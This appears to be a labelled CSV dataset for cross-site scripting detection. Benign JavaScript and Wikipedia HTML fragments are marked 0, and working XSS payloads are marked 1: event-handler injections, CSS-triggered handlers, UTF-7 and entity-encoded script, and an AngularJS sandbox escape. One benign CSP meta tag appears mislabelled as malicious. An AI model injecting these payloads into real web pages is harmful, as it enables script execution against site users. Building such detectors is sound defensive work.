payload,label
"_this51._handledocumentclickbound = _this51._handledocumentclick.bind(_this51); window.addeventlistener('scroll', _this51._handleclosebound, true); document.body.addeventlistener('click', _this51._handledocumentclickbound, true);",0
"e.target.getattribute('data-month'), e.target.getattribute('data-day') )",0
"<style>:target {transform: rotate(180deg);}</style><data id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></data>",1
modal.getinstance(alreadyopen).hide(); } const data = modal.getorcreateinstance(target);,0
"return selectorengine.findone(selector_active_item, this._element) } _getitems() {",0
"}; function hydrateobj(obj, meta = {}) { for (const [key, value] of object.entries(meta)) {",0
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationend=""alert(1)""></embed>",1
"value: function _animatecaptionin(caption, duration) {",0
pinstance._updateposition(); } },0
"} _deactivate(element, relatedelem) { if (!element) {",0
<thead onpointerleave=alert(1)>xss</thead>,1
"anim({ targets: el, opacity: 0,",0
<samp id=x tabindex=1 onfocus=alert(1)></samp>,1
<div onpointerenter=alert(1)>xss</div>,1
return !/^((?!chrome|android).)*safari/i.test(getuastring()),0
"<rt onkeyup=""alert(1)"" contenteditable>test</rt>",1
"<section onmousemove=""alert(1)"">test</section>",1
"eventhandler.trigger(this._element, event_hide_prevented); return; }",0
<object data=# codebase=javascript:alert(document.domain)//>,1
<dfn onpointerup=alert(1)>xss</dfn>,1
this.offsety = windowheight - this.btnbottom; this.$el.removeclass('active'); this.$el.css({,0
this.lastwindowheight = window.innerheight; this._createoverlay(); this._createdragtarget();,0
"<br onbeforepaste=""alert(1)"" contenteditable>test</br>",1
eventholders.foreach(function( eventholder ) {,0
"manipulator.setdataattribute(this._menu, 'popper', 'static')",0
"<div class=""toctitle"" lang=""en"" dir=""ltr""><h2 id=""mw-toc-heading"">contents </h2><span class=""toctogglespan""><label class=""toctogglelabel"" for=""toctogglecheckbox""> </label>",0
"<span class=""mw-editsection"">",0
"}, { key: ""_handlechipskeyup"", value: function _handlechipskeyup(e) {",0
} if (activechildren.length && activechildren[0]._istransitioning) { return,0
"<a onkeypress=""alert(1)"" contenteditable>test</a>",1
_setupdropdown() { this.wrapper = document.createelement('div'); $(this.wrapper).addclass('select-wrapper ' + this.options.classes);,0
"<frame onbeforecut=""alert(1)"" contenteditable>test</frame>",1
this._deltax = 0 if (!direction) { return,0
"}); } // gets the maximum area that the element is visible in due to any number of function getclippingrect(element, boundary, rootboundary, strategy) {",0
"<data draggable=""true"" ondrag=""alert(1)"">test</data>",1
"<svg onclick=""alert(1)"">test</svg>",1
"<video onkeyup=""alert(1)"" contenteditable>test</video>",1
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>,1
} open() { this._updatevars();,0
value: function _handleinputclick() { this.open(); },0
"</span> <span class=""reference-text""><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, p.&#160;18.",0
"<style>:target {color: red;}</style><thead id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></thead>",1
if ($currcontent.length) {,0
"this._swipehelper = new swipe(this._element, swipeconfig) } _keydown(event) {",0
_this47._updateposition(),0
"opacity: 0.5, induration: 250, outduration: 250,",0
<frameset id=x tabindex=1 onactivate=alert(1)></frameset>,1
function getselectsingle_(el) {,0
_this52.$anchor.css({,0
const event_click = 'click',0
<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>,1
if (this.activeindex >= 0) { this.$active = $(this.container).children('li').eq(this.activeindex); this.$active.addclass('active');,0
"{{{}[{tostring:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charat=[].join;$eval('x=alert(1)//');}}",1
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationend=""alert(1)""></aside>",1
_removeindicators() {,0
"this._setupindicators(); if (this.$active) { this.$active.css('display', 'block');",0
"<li class=""toclevel-1 tocsection-72""><a href=""#references""><span class=""tocnumber"">13",0
"v = [], b = 0, ia = function () {",0
"<legend oncopy=""alert(1)"" contenteditable>test</legend>",1
"<div draggable=""true"" contenteditable>drag me</div><blink ondrop=alert(1) contenteditable>drop here</blink>",1
<a onpointerleave=alert(1)>xss</a>,1
"<menuitem oncopy=""alert(1)"" contenteditable>test</menuitem>",1
"<li id=""cite_note-ai_widely_used-25""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-ai_widely_used_25-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-ai_widely_used_25-1""><sup><i><b>b </b> </i> </sup> </a>",0
"<select onmouseout=""alert(1)"">test</select>",1
if (pushpin._pushpins.length === 0) { this._removeeventhandlers(); },0
<a onpointerenter=alert(1)>xss</a>,1
"<ol onmouseover=""alert(1)"">test</ol>",1
"document.addeventlistener('touchend', this._handledocumentclickendbound)",0
"<a href=""/wiki/robot_rights"" class=""mw-redirect"" title=""robot rights"">robot rights </a>:",0
"<meter oncontextmenu=""alert(1)"">test</meter>",1
this._element.classlist.remove(class_name_show$8),0
"return isstring(c) && c.match(notwhitematch); } function hasclass(v, c) {",0
"<dl onmouseenter=""alert(1)"">test</dl>",1
<datalist id=x tabindex=1 ondeactivate=alert(1)></datalist><input id=y autofocus>,1
<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>,1
"<shadow onmouseover=""alert(1)"">test</shadow>",1
"function updateoptions ( optionstoupdate, firesetevent ) {",0
} toast._toasts.push(this); var toastelement = this._createtoast();,0
<script>alert(document.domain)</script>,1
<img id=x tabindex=1 onbeforeactivate=alert(1)></img>,1
"<li><a href=""/wiki/bertrand_russell"" title=""bertrand russell"">bertrand russell </a> </li>",0
"<dl oncontextmenu=""alert(1)"">test</dl>",1
"} _removeeventhandlers() { this.el.removeeventlistener('keydown', this._handletriggerkeydownbound);",0
for (let i = 0; i < this.chipsdata.length; i++) { let chipel = this._renderchip(this.chipsdata[i]); this.$el.append(chipel);,0
"this._removecounter(); } }, {",0
anim(animoptions); } _updatevars() {,0
"m.updatetextfields(); }); $(document).on('reset', function (e) {",0
"<li><cite id=""citerefclark2015"" class=""citation web"">clark, jack (8 december 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.bloomberg.com/news/articles/2015-12-08/why-2015-was-a-breakthrough-year-in-artificial-intelligence"">""why 2015 was a breakthrough year in artificial intelligence"" </a>. <i>bloomberg news </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20161123053855/https://www.bloomberg.com/news/articles/2015-12-08/why-2015-was-a-breakthrough-year-in-artificial-intelligence"">archived </a> from the original on 23 november 2016<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">23 november",0
"<progress onkeyup=""alert(1)"" contenteditable>test</progress>",1
<nextid id=x tabindex=1 onfocus=alert(1)></nextid>,1
this.el = toastelement,0
return direction === direction_left ? order_next : order_prev; } _ordertodirection(order) {,0
"<meta charset=""utf-7"" /> +adw-script+ad4-alert(1)+adw-/script+ad4-",1
return } const direction = absdeltax / this._deltax,0
"resize = _options$resize === void 0 ? true : _options$resize; var window = getwindow(state.elements.popper); var scrollparents = [].concat(state.scrollparents.reference, state.scrollparents.popper);",0
}); index_js.definejqueryplugin(scrollspy); return scrollspy;,0
"<li id=""cite_note-footnotetaotan2005-142""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnotetaotan2005_142-0"">^ </a> </b>",0
"<rt oncontextmenu=""alert(1)"">test</rt>",1
} _buildsvgclock() { let dialradius = this.options.dialradius;,0
"</span><a href=""/w/index.php?title=artificial_intelligence&amp;action=edit&amp;section=25"" title=""edit section: integrating the approaches"">edit </a><span class=""mw-editsection-bracket"">]",0
"m.checkpossiblealignments = function(el, container, bounding, offset) { let canalign = { top: true,",0
"<div draggable=""true"" contenteditable>drag me</div><element ondragover=alert(1) contenteditable>drop here</element>",1
themeswitcher.focus() } },0
} }); index_js.definejqueryplugin(collapse);,0
"_handlewindowscroll() { scrollspy._ticks++; let top = m.getdocumentscrolltop(),",0
"document.body.removeeventlistener('touchend', this._handledocumentclickbound); document.body.removeeventlistener('touchmove', this._handledocumenttouchmovebound); this.dropdownel.removeeventlistener('keydown', this._handledropdownkeydownbound);",0
"values[1] = (values[1] && filterfunc) ? filterfunc(values[0], values[1]) : values[1]",0
const event_resize = `resize${event_key}`; const event_click_dismiss = `click.dismiss${event_key}`; const event_mousedown_dismiss = `mousedown.dismiss${event_key}`;,0
"<style>:target {color: red;}</style><time id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></time>",1
} this._animateimagein(); this._handlewindowscrollbound = this._handlewindowscroll.bind(this);,0
"y: rect.top + scroll.scrolltop - offsets.y, width: rect.width, height: rect.height",0
"<multicol draggable=""true"" ondrag=""alert(1)"">test</multicol>",1
<link onfocusin=alert(1) id=x tabindex=1 style=display:block>,1
<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>,1
idealwidth += alignments.spaceonleft,0
options.onfirstupdate(state),0
<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>,1
"<meta http-equiv=""content-security-policy"" content=""upgrade-insecure-requests"">",1
"<audio ondblclick=""alert(1)"">test</audio>",1
"return function handler(event) { hydrateobj(event, { delegatetarget: element }) if (handler.oneoff) {",0
"const closeevent = eventhandler.trigger(this._element, event_close)",0
<meter onpointerover=alert(1)>xss</meter>,1
"<sub onmouseup=""alert(1)"">test</sub>",1
";(function ($) { m.updatetextfields = function () { var input_selector = 'input[type=text], input[type=password], input[type=email], input[type=url], input[type=tel], input[type=number], input[type=search], input[type=date], input[type=time], textarea';",0
"return h.hex(a) || h.rgb(a) || h.hsl(a); } }, a = function () {",0
"'js/toasts.js', 'js/sidenav.js', 'js/scrollspy.js',",0
<svg><rp onload=alert(1)></rp>,1
} _setactiveindicatorelement(index) { if (!this._indicatorselement) {,0
"const selector_tab_panel = '.list-group, .nav, [role=""tablist""]'",0
"<li><a href=""/wiki/monism"" title=""monism"">monism </a> </li>",0
if (typeof document.body.style[e] !== 'undefined') { this.xform = e; return false;,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><keygen id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></keygen>",1
<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>,1
nextactiveelement.focus({,0
<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>,1
} } _handledragtargetdrag(e) {,0
"<li><a href=""/wiki/allenna_leonard"" title=""allenna leonard"">allenna leonard </a> </li>",0
_setinitialattributesontargetpanel(child) {,0
"const selector_modal_body = '.modal-body'; const selector_data_toggle = '[data-bs-toggle=""modal""]'; const default = {",0
"eventhandler.off(window, event_key) eventhandler.off(this._dialog, event_key) this._backdrop.dispose()",0
<form><input type=submit formaction=javascript:alert(1) value=xss>,1
"settheme(theme) showactivetheme(theme, true) })",0
"const tip = this._gettipelement(); this._element.setattribute('aria-describedby', tip.getattribute('id')); const {",0
this.dim = this.itemwidth * 2 + this.options.padding; this.offset = this.center * 2 * this.itemwidth; this.target = this.offset;,0
"</span>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=unknown&amp;rft.jtitle=www.igmchicago.org&amp;rft.atitle=robots+and+artificial+intelligence&amp;rft_id=http%3a%2f%2fwww.igmchicago.org%2fsurveys%2frobots-and-artificial-intelligence&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
if (el.tagname.tolowercase() === 'input') {,0
"this.calendars[c].year, this.calendars[c].month, this.calendars[0].year,",0
$('.datepicker').datepicker(),0
"<li id=""cite_note-307""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-307"">^ </a> </b>",0
"<style>:target {color: red;}</style><frame id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frame>",1
"this.el, closestoverflowparent, dropdownbounds,",0
super.dispose(); } isshown() {,0
"} } function hasclass ( el, classname ) {",0
} ancestor = ancestor.parentnode; },0
"unit = math.pi / (ishours || roundby5 ? 6 : 30),",0
"}, removedataattribute(element, key) { element.removeattribute(`data-bs-${normalizedatakey(key)}`);",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dd>",1
_this20.$overlay.remove(),0
"} } function insertcontent(parent, child, prepend) {",0
const outerelem = this._getouterelement(element); if (!outerelem.classlist.contains(class_dropdown)) { return;,0
"<output onkeyup=""alert(1)"" contenteditable>test</output>",1
"let $hideselect = $('<div class=""hide-select""></div>'); $(this.wrapper).append($hideselect); $hideselect[0].appendchild(this.el);",0
"<div draggable=""true"" contenteditable>drag me</div><rtc ondrop=alert(1) contenteditable>drop here</rtc>",1
"let _defaults = { exitdelay: 200, enterdelay: 0,",0
<optgroup id=x tabindex=1 onfocus=alert(1)></optgroup>,1
"addhandler(element, event, handler, delegationfunction, false)",0
"formselect: root.queryselectorall('select:not(.no-autoinit)'),",0
"<li id=""cite_note-158""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-158"">^ </a> </b>",0
"var e = new float32array(11);if (c !== d || b !== f) for (var k = 0; 11 > k; ++k) { e[k] = a(.1 * k, c, b); }return function (k) {",0
"<menuitem onclick=""alert(1)"">test</menuitem>",1
<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>,1
"<u onbeforepaste=""alert(1)"" contenteditable>test</u>",1
"}, get: function (index) { if (index === undefined) {",0
} _handlecontainermouseupandtouchend(e) { this._mousedown = false;,0
"value: function done(e, clearvalue) {",0
trapelement: null // the element to trap focus inside of } const defaulttype = {,0
"margin = this.options.margin,",0
"var overflows = allowedplacements.reduce(function (acc, placement) {",0
"'left': relativex + 'px', 'opacity': '0', '-webkit-transition-duration': effect.duration + 'ms',",0
value: function _removeindicators() { this.$el.find('ul.indicators').remove(); },0
